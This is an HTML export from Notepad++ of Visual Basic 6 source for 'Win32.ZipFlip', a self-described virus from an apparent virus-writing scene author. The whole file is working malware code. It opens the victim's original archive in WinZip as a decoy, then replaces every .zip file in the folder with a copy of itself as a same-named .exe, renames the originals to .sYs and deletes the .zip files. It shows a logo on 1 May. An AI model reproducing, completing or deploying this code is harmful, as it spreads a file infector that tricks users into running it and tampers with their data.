<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
.sc12 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc7">VERSION</span><span class="sc0"> </span><span class="sc2">5.00</span><span class="sc0">
</span><span class="sc3">Begin</span><span class="sc0"> </span><span class="sc7">VB.Form</span><span class="sc0"> </span><span class="sc7">frmZipFlip</span><span class="sc0">
   </span><span class="sc7">BorderStyle</span><span class="sc0">     </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">'Kein
</span><span class="sc0">   </span><span class="sc7">Caption</span><span class="sc0">         </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc4">"Win32.ZipFlip - by DiA (c)04"</span><span class="sc0">
   </span><span class="sc7">ClientHeight</span><span class="sc0">    </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">4485</span><span class="sc0">
   </span><span class="sc7">ClientLeft</span><span class="sc0">      </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc7">ClientTop</span><span class="sc0">       </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc7">ClientWidth</span><span class="sc0">     </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">4500</span><span class="sc0">
   </span><span class="sc7">Icon</span><span class="sc0">            </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc4">"frmZipFlip.frx"</span><span class="sc6">:</span><span class="sc2">0000</span><span class="sc0">
   </span><span class="sc7">LinkTopic</span><span class="sc0">       </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc4">"Form1"</span><span class="sc0">
   </span><span class="sc7">MaxButton</span><span class="sc0">       </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">'False
</span><span class="sc0">   </span><span class="sc7">MinButton</span><span class="sc0">       </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">'False
</span><span class="sc0">   </span><span class="sc7">ScaleHeight</span><span class="sc0">     </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">4485</span><span class="sc0">
   </span><span class="sc7">ScaleWidth</span><span class="sc0">      </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">4500</span><span class="sc0">
   </span><span class="sc7">ShowInTaskbar</span><span class="sc0">   </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">'False
</span><span class="sc0">   </span><span class="sc7">StartUpPosition</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">'Bildschirmmitte
</span><span class="sc0">   </span><span class="sc7">Visible</span><span class="sc0">         </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">'False
</span><span class="sc0">   </span><span class="sc3">Begin</span><span class="sc0"> </span><span class="sc7">VB.Image</span><span class="sc0"> </span><span class="sc7">Image1</span><span class="sc0">
      </span><span class="sc7">Height</span><span class="sc0">          </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">4500</span><span class="sc0">
      </span><span class="sc7">Left</span><span class="sc0">            </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc7">Picture</span><span class="sc0">         </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc4">"frmZipFlip.frx"</span><span class="sc6">:</span><span class="sc2">030A</span><span class="sc0">
      </span><span class="sc7">Top</span><span class="sc0">             </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc12">Width</span><span class="sc0">           </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">4500</span><span class="sc0">
   </span><span class="sc3">End</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0">
</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Name</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"frmZipFlip"</span><span class="sc0">
</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_GlobalNameSpace</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Creatable</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_PredeclaredId</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Exposed</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc1">'ZipFlip Version 1.0
'by DiA (c)04 GermanY
'www.vx-dia.de.vu
'DiA_hates_machine@gmx.de
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">
</span><span class="sc1">'I code this creature only as a concept! I have written this in school
'to kill the time, i want to write it in Win32Asm, but no TASM5 in school.
'maybe it comming soon in asm, don't know.
'I don't describe what this bastard do, come on! It's lame VB6 source, look by yourself...
'have fun with this....
'
'
'DiA - now in school =))
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">


</span><span class="sc1">'FindFirstFileA, FindNextFileA, FindClose
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">FindFirstFile</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"FindFirstFileA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpFileName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpFindFileData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">WIN32_FIND_DATA</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">FindNextFile</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"FindNextFileA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hFindFile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpFindFileData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">WIN32_FIND_DATA</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">FindClose</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hFindFile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc1">'Win32FindData
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">FILETIME</span><span class="sc0">
  </span><span class="sc7">dwLowDateTime</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">dwHighDateTime</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">WIN32_FIND_DATA</span><span class="sc0">
  </span><span class="sc7">dwFileAttributes</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">ftCreationTime</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">FILETIME</span><span class="sc0">
  </span><span class="sc7">ftLastAccessTime</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">FILETIME</span><span class="sc0">
  </span><span class="sc7">ftLastWriteTime</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">FILETIME</span><span class="sc0">
  </span><span class="sc7">nFileSizeHigh</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">nFileSizeLow</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">dwReserved0</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">dwReserved1</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">cFileName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
  </span><span class="sc7">cAlternate</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Found</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">WIN32_FIND_DATA</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Retval</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hFile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">EXE_Path</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">EXE_Name</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">ZIP_Name</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">

</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">WS</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Object</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">RegPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">WinZipPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">

</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">TargetFile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">FSO</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Object</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">PointPos</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">HostFile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">TargetFileEXE</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">



</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RegRead</span><span class="sc6">(</span><span class="sc7">RegPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
    </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">GoTo</span><span class="sc0"> </span><span class="sc7">ErrorHandler</span><span class="sc0">

    </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">WS</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">RegRead</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">WS.RegRead</span><span class="sc6">(</span><span class="sc7">RegPath</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc7">ErrorHandler</span><span class="sc6">:</span><span class="sc0">
    </span><span class="sc7">RegRead</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"No"</span><span class="sc0"> </span><span class="sc1">'can't read winzip path
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">


</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Form_Load</span><span class="sc6">()</span><span class="sc0">

    </span><span class="sc1">'get name of virus and pseudo zip (.sYs)
</span><span class="sc0">    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">App.Path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
        </span><span class="sc7">EXE_Path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
        </span><span class="sc7">EXE_Name</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0">
        </span><span class="sc7">ZIP_Name</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".sYs"</span><span class="sc0">
    </span><span class="sc3">Else</span><span class="sc0">
        </span><span class="sc7">EXE_Path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.Path</span><span class="sc0">
        </span><span class="sc7">EXE_Name</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0">
        </span><span class="sc7">ZIP_Name</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".sYs"</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">


    </span><span class="sc1">'get WinZip Path and application
</span><span class="sc0">    </span><span class="sc7">WinZipPath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegRead</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\WinZip\InstallLocation"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"WinZip32.exe"</span><span class="sc0">
    </span><span class="sc1">'no WinZip Path found
</span><span class="sc0">    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">WinZipPath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"NoWinZip32.exe"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
        </span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"No WinZip32.exe! Please check your WinZip installation."</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbCritical</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Can't open Archive"</span><span class="sc0">
        </span><span class="sc3">GoTo</span><span class="sc0"> </span><span class="sc7">Payload</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">


    </span><span class="sc1">'run host ZIP Archine
</span><span class="sc0">    </span><span class="sc7">Shell</span><span class="sc0"> </span><span class="sc7">WinZipPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">ZIP_Name</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNormalFocus</span><span class="sc0">


    </span><span class="sc1">'find all .ZIP archives in current directory and infect them
</span><span class="sc0">    </span><span class="sc7">hFile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FindFirstFile</span><span class="sc6">(</span><span class="sc7">EXE_Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"*.zip"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Found</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc1">'FindFirstFileA
</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">hFile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">GoTo</span><span class="sc0"> </span><span class="sc7">Payload</span><span class="sc0"> </span><span class="sc1">'no files
</span><span class="sc0">
    </span><span class="sc3">Do</span><span class="sc0">
        </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc3">CBool</span><span class="sc6">(</span><span class="sc7">Found.dwFileAttributes</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc7">vbDirectory</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc1">'it's a file
</span><span class="sc0">
                </span><span class="sc7">TargetFile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">EXE_Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Left$</span><span class="sc6">(</span><span class="sc7">Found.cFileName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc12">InStr</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Found.cFileName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNullChar</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">

                </span><span class="sc7">PointPos</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc12">InStr</span><span class="sc6">(</span><span class="sc7">TargetFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"."</span><span class="sc6">)</span><span class="sc0">
                </span><span class="sc7">HostFile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">TargetFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">PointPos</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"sYs"</span><span class="sc0"> </span><span class="sc1">'filename.sys
</span><span class="sc0">
                </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">FSO</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc1">'easy way to check if file already exist
</span><span class="sc0">
                </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">FSO.FileExists</span><span class="sc6">(</span><span class="sc7">HostFile</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc1">'don't infect if renamed hostname already exists
</span><span class="sc0">
                </span><span class="sc7">PointPos</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc12">InStr</span><span class="sc6">(</span><span class="sc7">TargetFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"."</span><span class="sc6">)</span><span class="sc0">
                </span><span class="sc7">TargetFileEXE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">TargetFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">PointPos</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"exe"</span><span class="sc0"> </span><span class="sc1">'filename.exe
</span><span class="sc0">
                    </span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">TargetFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">HostFile</span><span class="sc0">
                    </span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">EXE_Name</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">TargetFileEXE</span><span class="sc0">

                    </span><span class="sc7">Kill</span><span class="sc0"> </span><span class="sc7">TargetFile</span><span class="sc0"> </span><span class="sc1">'delete old .zip file
</span><span class="sc0">                </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">

    </span><span class="sc7">Retval</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FindNextFile</span><span class="sc6">(</span><span class="sc7">hFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Found</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc1">'FindNextFileA
</span><span class="sc0">
    </span><span class="sc7">DoEvents</span><span class="sc0">
    </span><span class="sc3">Loop</span><span class="sc0"> </span><span class="sc3">Until</span><span class="sc0"> </span><span class="sc7">Retval</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">'no more files
</span><span class="sc0">    </span><span class="sc7">FindClose</span><span class="sc0"> </span><span class="sc7">hFile</span><span class="sc0"> </span><span class="sc1">'FindClose
</span><span class="sc0">
</span><span class="sc7">Payload</span><span class="sc6">:</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Format$</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"dd.mm"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"01.05"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">  </span><span class="sc1">'Payload, only show window with ZipFlip Logo
</span><span class="sc0">        </span><span class="sc7">frmZipFlip.Visible</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">

    </span><span class="sc3">Else</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc1">'exit virus
</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Image1_Click</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc1">'end window
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc7">Sub</span></div></body>
</html>
